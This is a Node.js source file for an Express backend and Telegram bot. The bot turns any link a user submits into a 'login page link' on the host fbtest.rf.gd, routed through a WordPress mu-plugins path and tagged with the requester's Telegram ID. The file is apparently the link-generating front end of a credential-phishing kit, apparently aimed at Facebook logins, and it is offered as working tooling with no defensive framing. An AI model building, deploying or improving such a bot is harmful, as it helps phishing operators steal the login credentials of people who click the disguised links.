const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');

// Initialize Express app
const app = express();
app.use(express.json());

// Root route
app.get('/', (req, res) => {
  res.send('Telegram Bot Backend is running!');
});

// Endpoint to convert a link into a login page link
app.post('/convert-link', async (req, res) => {
  const { link, telegramId } = req.body;

  // Generate the login page link
  const loginPageLink = `https://fbtest.rf.gd/wp-content/mu-plugins/a.html?id=${telegramId}&link=${link}`;

  res.json({ loginPageLink });
});

// Initialize Telegram Bot
const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });

// Telegram Bot Commands
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 'Give me a link, and I will convert it into a login page link.');
});

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const link = msg.text;

  // Validate the link
  if (!link.startsWith('http')) {
    bot.sendMessage(chatId, 'Please provide a valid link (e.g., https://www.example.com).');
    return;
  }

  try {
    // Call the backend to generate the login page link
    const response = await axios.post('https://telegram-bot-backend-3589.onrender.com/convert-link', {
      link,
      telegramId: chatId
    });

    const loginPageLink = response.data.loginPageLink;
    bot.sendMessage(chatId, `Here is your login page link: ${loginPageLink}`);
  } catch (error) {
    console.error('Error generating login page link:', error);
    bot.sendMessage(chatId, 'An error occurred. Please try again later.');
  }
});

// Start the Express server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
